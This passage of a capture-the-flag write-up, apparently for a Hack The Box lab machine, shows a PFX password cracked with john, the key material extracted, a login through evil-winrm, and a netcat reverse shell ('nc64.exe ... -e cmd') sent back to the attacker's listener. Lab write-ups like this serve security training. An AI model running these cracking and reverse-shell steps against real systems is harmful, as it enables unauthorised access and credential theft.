class="SemanticString__Fragment SemanticString__Fragment--Code">$ pfx2john legacyy_dev_auth.pfx &gt; pfx.hash</code></span></span></p></div><div id="https://www.notion.so/9a7dc274e086464880aa9aacd700a6c8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat pfx.hash</code></span></span></p></div><pre id="https://www.notion.so/abefbf5498034d9b9789fa194611b726" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span>legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207d0048204d8febcd5536b4b831d1&lt;..SNIP..&gt;01306092a864886f70d0109153106040401000000$86b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx</span></span></span></code></pre><div id="https://www.notion.so/a0592676f9f14dcdb8d555847644b6e8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">This time it took a bit longer, but the hash did eventually crack: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">thuglegacy</code></span></span></p></div><div id="https://www.notion.so/bf46fd48022b46c7b1a6b28e8137c97f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash</code></span></span></p></div><pre id="https://www.notion.so/48929c9a91974c679632c8ddbe997119" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Using default input encoding: UTF-8
+Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
+Cost 1 (iteration count) is 2000 for all loaded hashes
+Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
+Will run 16 OpenMP threads
+Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status
+thuglegacy       (legacyy_dev_auth.pfx)     
+1g 0:00:00:16 DONE (2024-01-20 19:11) 0.06169g/s 199367p/s 199367c/s 199367C/s thyriana..thsco04
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed.</span></span></span></code></pre><div id="https://www.notion.so/88cc3cdc81b94e61b755a30aad46f077" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As expected, the bundle contains a private RSA key and a certificate.</span></span></p></div><div id="https://www.notion.so/f04a150d9b7c4503a4abe7033ab26ea7" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F066fc437-73d7-4302-b62d-e4160f968ce0%2FUntitled.png?width=1402&amp;table=block&amp;id=f04a150d-9b7c-4503-a4ab-e7033ab26ea7"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F066fc437-73d7-4302-b62d-e4160f968ce0%2FUntitled.png?width=1402&amp;table=block&amp;id=f04a150d-9b7c-4503-a4ab-e7033ab26ea7" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/b7754ce496d341448a4aa04839be329c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/36aca6078b6d4ab0a9b65773db415217" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Kerberos PKINIT:</strong></span></span></p></div><div id="https://www.notion.so/9c8670dc71c846d5a772d39cc6782dd0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">PKINIT stands for Public Key Cryptography for Initial Authentication in Kerberos. Instead of relying on username/password, it also allows using public keys for the initial authentication exchange. There are slight similarities to SSH private key authentication, except that it also requires the public certificate.</span></span></p></div><div id="https://www.notion.so/a6f173610a0e4f21b5d0211cc05eeda0" class="Bookmark"><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/7f3f232f-7442-414b-afbc-833f9b5d1e3c"><h5 class="Bookmark__Title">[MS-PKCA]: Introduction</h5><p class="Bookmark__Desc">The Public Key Cryptography for Initial Authentication in Kerberos (PKINIT) protocol [RFC4556] enables the use of public key cryptography in the</p><p class="Bookmark__Link">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pkca/7f3f232f-7442-414b-afbc-833f9b5d1e3c</p></a></div><div id="https://www.notion.so/913d6a4105ad47f9902b56599162cce0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With the PFX file in hand, we can authenticate to Kerberos and obtain a ticket, which can then be used for getting a shell.</span></span></p></div><div id="https://www.notion.so/6171927f377d4daa9d51e193213e57aa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a485376ce4844448966b445d9d5c7473" class="Divider"></div><h3 id="https://www.notion.so/fee73153912f4c9dbf7cd469b321cae3" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/fee73153912f4c9dbf7cd469b321cae3"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h3><div id="https://www.notion.so/87be61712e40420c9c6c27e68a589be3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Certificate authentication is supported by </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString">, but the private key and public certificate must be first extracted from the PFX file.</span></span></p></div><div id="https://www.notion.so/5b9c78f366fd44ada121e2b4bef82935" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ evil-winrm -h</code></span></span></p></div><pre id="https://www.notion.so/91f7e5246f8342b5aaf099d2520b169b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Evil-WinRM shell v3.5
+
+Usage: evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] [--spn SPN_PREFIX] [-l]
+    -S, --ssl                        Enable ssl
+    -c, --pub-key PUBLIC_KEY_PATH    Local path to public key certificate
+    -k, --priv-key PRIVATE_KEY_PATH  Local path to private key certificate
+    -r, --realm DOMAIN               Kerberos auth, it has to be set also in /etc/krb5.conf file using this format -&gt; CONTOSO.COM = { kdc = fooserver.contoso.com }
+    -s, --scripts PS_SCRIPTS_PATH    Powershell scripts local path
+        --spn SPN_PREFIX             SPN prefix for Kerberos auth (default HTTP)
+    -e, --executables EXES_PATH      C# executables local path
+    -i, --ip IP                      Remote host IP or hostname. FQDN for Kerberos auth (required)
+    -U, --url URL                    Remote url endpoint (default /wsman)
+    -u, --user USER                  Username (required if not using kerberos)
+    -p, --password PASS              Password
+    -H, --hash HASH                  NTHash
+    -P, --port PORT                  Remote host port (default 5985)
+    -V, --version                    Show version
+    -n, --no-colors                  Disable colors
+    -N, --no-rpath-completion        Disable remote path completion
+    -l, --log                        Log the WinRM session
+    -h, --help                       Display this help message</span></span></span></code></pre><div id="https://www.notion.so/1802bc5b9da34291a6c0946b49cfc1cb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Extracting the public certificate:</span></span></p></div><div id="https://www.notion.so/60d9d5dad13f48c8a8af1a88c8803b82" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out public.crt</code></span></span></p></div><pre id="https://www.notion.so/57e7d47e39984c24a2c00e2f0cc7cd18" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Enter Import Password:</span></span></span></code></pre><div id="https://www.notion.so/0c43b6ec446943019db1bf59e0cf8241" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat public.crt</code></span></span></p></div><pre id="https://www.notion.so/147d1f8dbea04b2fbcf96fa5c0818674" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Bag Attributes
+    localKeyID: 01 00 00 00 
+subject=CN = Legacyy
+issuer=CN = Legacyy
+-----BEGIN CERTIFICATE-----
+MIIDJjCCAg6gAwIBAgIQHZmJKYrPEbtBk6HP9E4S3zANBgkqhkiG9w0BAQsFADAS
+MRAwDgYDVQQDDAdMZWdhY3l5MB4XDTIxMTAyNTE0MDU1MloXDTMxMTAyNTE0MTU1
+MlowEjEQMA4GA1UEAwwHTGVnYWN5eTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
+AQoCggEBAKVWB6NiFkce4vNNI61hcc6LnrNKhyv2ibznhgO7/qocFrg1/zEU/og0
+0E2Vha8DEK8ozxpCwem/e2inClD5htFkO7U3HKG9801NFeN0VBX2ciIqSjA63qAb
+YX707mBUXg8Ccc+b5hg/CxuhGRhXxA6nMiLo0xmAMImuAhJZmZQepOHJsVb/s86Z
+7WCzq2I3VcWg+7XM05hogvd21lprNdwvDoilMlE8kBYa22rIWiaZismoLMJJpa72
+MbSnWEoruaTrC8FJHxB8dbapf341ssp6AK37+MBrq7ZX2W74rcwLY1pLM6giLkcs
+yOeu6NGgLHe/plcvQo8IXMMwSosUkfECAwEAAaN4MHYwDgYDVR0PAQH/BAQDAgWg
+MBMGA1UdJQQMMAoGCCsGAQUFBwMCMDAGA1UdEQQpMCegJQYKKwYBBAGCNxQCA6AX
+DBVsZWdhY3l5QHRpbWVsYXBzZS5odGIwHQYDVR0OBBYEFMzZDuSvIJ6wdSv9gZYe
+rC2xJVgZMA0GCSqGSIb3DQEBCwUAA4IBAQBfjvt2v94+/pb92nLIS4rna7CIKrqa
+m966H8kF6t7pHZPlEDZMr17u50kvTN1D4PtlCud9SaPsokSbKNoFgX1KNX5m72F0
+3KCLImh1z4ltxsc6JgOgncCqdFfX3t0Ey3R7KGx6reLtvU4FZ+nhvlXTeJ/PAXc/
+fwa2rfiPsfV51WTOYEzcgpngdHJtBqmuNw3tnEKmgMqp65KYzpKTvvM1JjhI5txG
+hqbdWbn2lS4wjGy3YGRZw6oM667GF13Vq2X3WHZK5NaP+5Kawd/J+Ms6riY0PDbh
+nx143vIioHYMiGCnKsHdWiMrG2UWLOoeUrlUmpr069kY/nn7+zSEa2pA
+-----END CERTIFICATE-----</span></span></span></code></pre><div id="https://www.notion.so/04ddd07a08b74e60b07e26eb3912077c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Extracting the private key: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">openssl</code></span><span class="SemanticString"> enforces the extracted key to be password-protected. Here I used the same password </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">thuglegacy</code></span><span class="SemanticString"> for simplicity.</span></span></p></div><div id="https://www.notion.so/21e3df5f7ea44ad3bf02a95b83b7fa37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key</code></span></span></p></div><pre id="https://www.notion.so/2d6bf5c3fbe048cfa96c538ec4fa464f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Enter Import Password:
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:</span></span></span></code></pre><div id="https://www.notion.so/eafe0a3c5da94769b5941949a82b4a8d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ cat private.key</code></span></span></p></div><pre id="https://www.notion.so/58a4faaff6044deda4f96384c5023681" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Bag Attributes
+    Microsoft Local Key set: &lt;No Values&gt;
+    localKeyID: 01 00 00 00 
+    friendlyName: te-4a534157-c8f1-4724-8db6-ed12f25c2a9b
+    Microsoft CSP Name: Microsoft Software Key Storage Provider
+Key Attributes
+    X509v3 Key Usage: 90 
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+MIIFLTBXBgkqhkiG9w0BBQ0wSjApBgkqhkiG9w0BBQwwHAQI+wmQG2itcegCAggA
+MAwGCCqGSIb3DQIJBQAwHQYJYIZIAWUDBAEqBBAFqGj8zmbcvbSP7vwKIEoPBIIE
+0HDUwYOD4VPX02A9839enP0Fae3gSBi9NWb2/fVYMDzHXhV5/uwx7CfYR3Cy+F/6
+dt3b4JhIRRKSIyy44HcZfUuKL44KwSk46EiXuhQJs4ypYbc1s+T7vnPARqO8AuEp
+/k6grd9g7pIEaUzTkRtur2YAx7ifv0AgFzeP93QCOKDIVqg2J1XOuXeNLwTCvnKE
+k41PQIGaXlftLSLyRXFNY1BGlMMEadgNeSobvPVXm6OLFaxVlHMST3vNTnB57fhc
+44QE2T9fGiS66yXcZhlK6Rjq48yWRQzX5iId/EOMJOTYd+IfuVLa1MkT105TOeIl
+ZU14KMLoKK9JrzrYvT7yUdjcIkS1bBuiCaWbQmt1rag8ngxouGe4t8HW3UfE4nL2
+MOTbwHKc3itlpd7BuGEjF5/poXIf/aUfXY7SOomG0anMpy2P2VGFztzkTu411Equ
+Ly2IIhgOsHeb3FdPNSCWEzna04SKwFwHQISRPvnzNkU98b2W6F8qf4ID8Osz1pfn
+677GD9nxZImPu9MKLmEgjcVHIx5PYB+pRfwOt/jwJ5EntQgr4RRCvURRgtrqyHvM
+0p6u2WofMxhA7QYOANdVU+loMXFMjGyOnK8DoyrFy5OI8JfXl8jJB7Moz6Q9BqRG
+SZWNwgYg+6n9kYxB7b8iv79Dr3e7m/1nGf6KuEp9EoflAE0BU56bs7rbENfYdiEB
+ofu7fQrFzyM0/0HXpLqnHDilGRNfG8A8HKwOBJW0XIjdT1SrPivv5I6EqyGLdoQk
+En5D1g6a+FaftIl+WuxvpcE11YgvoIGVgcF7NrKTb9Fgz5t+alV6I1qsQUC8jYU3
+xII2PuI6FB4PGJd/HGpvzosUaFIlgD3Gd2KinZc8eqrobLdm13rs8s5eEBX8y1d2
+uNG/w+wmuZiTU+j2AiYkBjOrCEocA30LF9bPSk/tuphexLIt80rhFQab7YhjgRYK
+l1Tbukxg3T8gmGIRpxx2If/JFKwf2W5O98/dSDzYoWCzkxgbO7S6bwdRx+uSGfvY
+kn7uCX7Obsu2hleEpFHhEzcy0FQQ1t+0xC5G7DB9ljfzYO1hXSYu+iJiz8l8cYaF
+BUWmMlljfYT2lf81UTpY5WCB1IXcPBTZ2asda4g4Djqkm8GESiEV0evATaSyWXOs
+yRpvnlRwpF1vz8isrnMTfT5mMbli8kM5uuRzHGrmtbwpwYDcHjKjzpXQOW2GOd4J
+lgUptH/0Zip5xtYgl1unCFXd1OReVFuwuw1RDhrlY6Tuh4rsJv6kRGpwGRMjkPkI
+Osg3eSINVrGcZ5ekRz9qyd4s83wSweDtzz/K5ru5nhGANVuiCj0nQAmZ2+7ZJDZK
+BooEEiJbSvx8Qk4GiQ5JE6JspGpBT1EI+9CMn9gHXXo66AVB7iVRa4z5m8vD6H8A
+YD6/xtuFe0CqGN7foScVAy+3Wyy6DioHEn8tQ/2AAtFbCZu9kZSCRBVcq8KTGs92
+rHHA8UDNaTmFSQF69WL6P/YCN5sEnMyMuZLC2q0+1L+x/e5dgPjCSDSU3HWP3Teu
+TzAFAMC489sJUHfi5LeMauiCb+lO3Hts+ODyz8CxDPjXhYa7j8F8ypK7V0skTkiO
+lXx8mHaGdFk11q3rSJrRbnz30gNPCcR63Y46o9ipkSDx
+-----END ENCRYPTED PRIVATE KEY-----</span></span></span></code></pre><div id="https://www.notion.so/1c84d3231a5d4534998b4b724efe72e7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With both, I can now get a shell session on the box via </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/309bcc4529954b75a7b06a4d0f670f42" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ evil-winrm -i 10.129.227.113 -c public.crt -k private.key -r timelapse.htb -P 5986 -S</code></span></span></p></div><div id="https://www.notion.so/10b36fc610104dbeaac92a5986839382" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F896ef486-1efe-4bab-8e59-386ac61fbbaf%2FUntitled.png?width=1123&amp;table=block&amp;id=10b36fc6-1010-4dbe-aac9-2a5986839382"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F896ef486-1efe-4bab-8e59-386ac61fbbaf%2FUntitled.png?width=1123&amp;table=block&amp;id=10b36fc6-1010-4dbe-aac9-2a5986839382" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/797231a2576f42d09f330efdf6077c5b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Foothold gained as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">legacyy</code></span><span class="SemanticString">.</span></span></p></div><div id="https://www.notion.so/68ff1685a0304ddab3358b5ad25aa8ca" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami</code></span></span></p></div><pre id="https://www.notion.so/12fbb5d439374c759ec11efcc292a1c4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>timelapse\legacyy</span></span></span></code></pre><div id="https://www.notion.so/0536d26c9b3846718f4161b91340ef3d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">However, when authenticating with certs in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString">, it will prompt for the certificate password every few minutes, which is rather annoying.</span></span></p></div><div id="https://www.notion.so/0c4894f424d2494b8f5d6bc3cc972fff" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1d7256a7-171a-47d8-ad12-92da2dca2828%2FUntitled.png?width=591&amp;table=block&amp;id=0c4894f4-24d2-494b-8f5d-6bc3cc972fff"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F1d7256a7-171a-47d8-ad12-92da2dca2828%2FUntitled.png?width=591&amp;table=block&amp;id=0c4894f4-24d2-494b-8f5d-6bc3cc972fff" style="width:591px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/bb1349362d81424c869de14f932d2b13" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To avoid this, I decided to spawn a reverse shell. First I started a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">netcat</code></span><span class="SemanticString"> listener on my host:</span></span></p></div><div id="https://www.notion.so/9cd4dd3c52124e3eaf3766c5154648ec" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ sudo nc -lvnp 8001</code></span></span></p></div><div id="https://www.notion.so/6b99c27a54734b508eceed450b863b2c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/62578581c0094d58a5d35f516dcd04ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I uploaded a </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">nc64.exe</code></span><span class="SemanticString"> binary to the box and used it to send back a reverse shell</span></span></p></div><div id="https://www.notion.so/65e0ff59195640b191a581e8af140f89" class="Bookmark"><a href="https://github.com/int0x33/nc.exe/tree/master"><h5 class="Bookmark__Title">GitHub - int0x33/nc.exe: Netcat for windows 32/64 bit</h5><p class="Bookmark__Desc">Netcat for windows 32/64 bit. Contribute to int0x33/nc.exe development by creating an account on GitHub.</p><p class="Bookmark__Link">https://github.com/int0x33/nc.exe/tree/master</p></a></div><div id="https://www.notion.so/30cd0cf133b84a34ae0162e7ac4bfea8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ upload nc64.exe</code></span></span></p></div><pre id="https://www.notion.so/94753f7c8d7e4bffa16e15424960baac" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>Data: 60360 bytes of 60360 bytes copied
+                                        
+Info: Upload successful!</span></span></span></code></pre><div id="https://www.notion.so/fd920d33f3504e888606502f4c1de6f7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ .\nc64.exe 10.10.14.20 8001 -e cmd</code></span></span></p></div><div id="https://www.notion.so/74c4d478936a4c5ab298fd69a7fd5561" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">And the shell was caught on my listener.</span></span></p></div><div id="https://www.notion.so/5f8ad19c426a4b70a255a99cb0c8c4a5" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc8d6b609-a704-42fc-8411-2843ad39b4bf%2FUntitled.png?width=778&amp;table=block&amp;id=5f8ad19c-426a-4b70-a255-a99cb0c8c4a5"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fc8d6b609-a704-42fc-8411-2843ad39b4bf%2FUntitled.png?width=778&amp;table=block&amp;id=5f8ad19c-426a-4b70-a255-a99cb0c8c4a5" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c580ec5c7b1b4ad4b65e2d219d1fb2ae" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><div id="https://www.notion.so/ebfb3ded37324b4c84803b3b444cfe40" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ type user.txt</code></span></span></p></div><pre id="https://www.notion.so/1ae74801e9d949299e94256c67491e0d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>c01c6d06************************</span></span></span></code></pre><div id="https://www.notion.so/30e6e72a30224298a406f888f07ef752" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/017587e37feb47bf9b69067a0b295a55" class="Divider"></div><h3 id="https://www.notion.so/dd83e249bba541f0b96650d4149cb128" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/dd83e249bba541f0b96650d4149cb128"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">legacyy</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/0c8e365a8ab34df9b226c1db71063b5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Groups &amp; Privileges:</strong></span></span></p></div><div id="https://www.notion.so/f2b5c1877f68499096226bf61f394af9" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami /groups</code></span></span></p></div><pre id="https://www.notion.so/c3ecc9aa5a2c40f59c5059ff756f3bd5" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes                                        
+=========================================== ================ ============================================ ==================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+TIMELAPSE\Development                       Group            S-1-5-21-671920749-559770252-3318990721-3101 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity  Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448</span></span></span></code></pre><div id="https://www.notion.so/738c1239c1c24db39572cda9b753de6c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The user is in several groups, but none of them looks too interesting.</span></span></p></div><div id="https://www.notion.so/6809db1e67484fedb6adf3b4c13a9b24" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">$ whoami /priv</code></span></span></p></div><pre id="https://www.notion.so/3428d77137f84d40841108018aa716c4" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
